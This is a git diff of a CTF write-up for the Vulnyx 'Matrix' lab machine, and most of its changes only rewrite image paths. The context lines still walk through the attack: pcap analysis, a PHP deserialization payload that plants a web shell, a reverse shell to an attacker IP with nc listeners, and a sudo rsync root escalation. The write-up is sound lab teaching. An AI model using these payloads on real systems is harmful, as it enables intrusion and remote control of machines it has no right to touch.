@@ -5,7 +5,7 @@ title: WriteUp Matrix - Vulnyx
 slug: matrix-writeup-vulnyx-en
 featured: false
 draft: false
-ogImage: "assets/matrix/OpenGraph.png"
+ogImage: "../../assets/images/matrix/OpenGraph.png"
 tags:
   - writeup
   - vulnyx
@@ -18,7 +18,7 @@ description:
 lang: en
 ---
 
-![Rabbit in Matrix](/assets/matrix/OpenGraph.png)
+![Rabbit in Matrix](../../assets/images/matrix/OpenGraph.png)
 
 This writeup documents the exploitation of a vulnerable machine inspired by Matrix, using traffic analysis, PHP injection, and privilege escalation with rsync to gain root access.
 
@@ -60,11 +60,11 @@ We see two open ports, 22 for the SSH service and port 80 for the Web service.
 
 We access the web service using the browser.
 
-![alt text](/assets/matrix/image-1.png)
+![alt text](../../assets/images/matrix/image-1.png)
 
 Inside the source code, we find a comment with a clue.
 
-![alt text](/assets/matrix/image-2.png)
+![alt text](../../assets/images/matrix/image-2.png)
 
 `Follow the red rabbit... Is it a dream or a clue? Within the saved traffic, you may find traces of the Matrix. Could it be a .pcap file ready to fuzz?`
 
@@ -74,7 +74,7 @@ So without hesitation, we perform fuzzing on the web service in search of a file
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.168 -x .pcap,.php,.txt,.zip,.db
 ```
 
-![alt text](/assets/matrix/image-3.png)
+![alt text](../../assets/images/matrix/image-3.png)
 
 We find a file named `trinity.pcap`.
 
@@ -90,9 +90,9 @@ We find many users, passwords, and subdomains of different services (FTP, RSYNC,
 
 We detect an image being transferred via HTTP and attempt to extract it from the traffic using Wireshark.
 
-![alt text](/assets/matrix/image-4.png)
+![alt text](../../assets/images/matrix/image-4.png)
 
-![alt text](/assets/matrix/image-5.png)
+![alt text](../../assets/images/matrix/image-5.png)
 
 Once downloaded, we rename it and analyze the metadata with the `exiftool` tool.
 
@@ -118,7 +118,7 @@ We find a very interesting comment in the `Description` metadata, where another 
 Morpheus, we have found a direct connection to the 'Mind', the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.
 ```
 
-![alt text](/assets/matrix/image-7.png)
+![alt text](../../assets/images/matrix/image-7.png)
 
 Other ways to obtain this subdomain and other sensitive data from the pcap file include analyzing the traffic within Wireshark itself or using the `strings` and `grep` commands.
 
@@ -139,7 +139,7 @@ M47r1X.matrix.nyx
 
 More information can be found in the `.pcap` file...
 
-![alt text](/assets/matrix/image-6.png)
+![alt text](../../assets/images/matrix/image-6.png)
 
 Some subdomains are irrelevant, but the one that works is `M47r1X.matrix.nyx`, which contains a virtual host. We add it to our hosts file.
 
@@ -147,15 +147,15 @@ Some subdomains are irrelevant, but the one that works is `M47r1X.matrix.nyx`, w
 
 We access the virtual host `M47r1X.matrix.nyx` through the browser to enter **The Mind** of the Matrix ;)
 
-![alt text](/assets/matrix/image-8.png)
+![alt text](../../assets/images/matrix/image-8.png)
 
 If we send messages, the chat always responds with strange symbols. However, there is a random chance it might provide a clue:
 
-![alt text](/assets/matrix/image-9.png)
+![alt text](../../assets/images/matrix/image-9.png)
 
 We obtain a file containing a backend leak.
 
-![alt text](/assets/matrix/image-10.png)
+![alt text](../../assets/images/matrix/image-10.png)
 
 In the page source code, we find a comment and JavaScript code that gives us more hints about the intrusion process, as well as a possible message related to the backend leak.
 
@@ -171,7 +171,7 @@ In the page source code, we find a comment and JavaScript code that gives us mor
 
 We use BurpSuite to facilitate the intrusion. We send the message `test` and observe that it sends a PHP-serialized object, which is likely deserialized on the server using the leaked PHP class.
 
-![alt text](/assets/matrix/image-11.png)
+![alt text](../../assets/images/matrix/image-11.png)
 
 ```bash
 O:7:"Message":1:{s:7:"message";s:4:"test";}
@@ -205,11 +205,11 @@ We execute the script, and this is what we will send:
 O:7:"Message":2:{s:4:"file";s:9:"shell.php";s:7:"message";s:33:"<?php echo exec($_GET[\"cmd\"]); ?>";}
 ```
 
-![alt text](/assets/matrix/image-12.png)
+![alt text](../../assets/images/matrix/image-12.png)
 
 Now we have an RCE through the `shell.php` file created by deserializing the PHP message.
 
-![alt text](/assets/matrix/image-13.png)
+![alt text](../../assets/images/matrix/image-13.png)
 
 We create a reverse shell in PHP. The IP `192.168.1.116` belongs to our attacking machine.
 
@@ -227,7 +227,7 @@ nc -lvnp 443
 wget http://m47r1x.matrix.nyx/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.116%22%2C443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 ```
 
-![alt text](/assets/matrix/image-14.png)
+![alt text](../../assets/images/matrix/image-14.png)
 
 Now we are the `www-data` user.
 
@@ -288,7 +288,7 @@ We enter the leaked password, and we are now `smith`.
 
 The more complex method: If we use `pspy64` or any other tool, we can monitor processes running under the `smith` user.
 
-![alt text](/assets/matrix/image-15.png)
+![alt text](../../assets/images/matrix/image-15.png)
 
 We observe that there is a scheduled task running every minute.
 
@@ -327,7 +327,7 @@ nc -lvnp 12345
 
 And after one minute, we obtain a shell as the `smith` user.
 
-![alt text](/assets/matrix/image-16.png)
+![alt text](../../assets/images/matrix/image-16.png)
 
 ### smith to root (sudo rsync)
 
@@ -383,7 +383,7 @@ User smith may run the following commands on matrix:
 
 We can execute `rsync` as the root user. Thanks to `gtfobins`, we find a way to escalate privileges to root.
 
-![alt text](/assets/matrix/image-17.png)
+![alt text](../../assets/images/matrix/image-17.png)
 
 We execute it and obtain a root shell, allowing us to read the final flag.
 
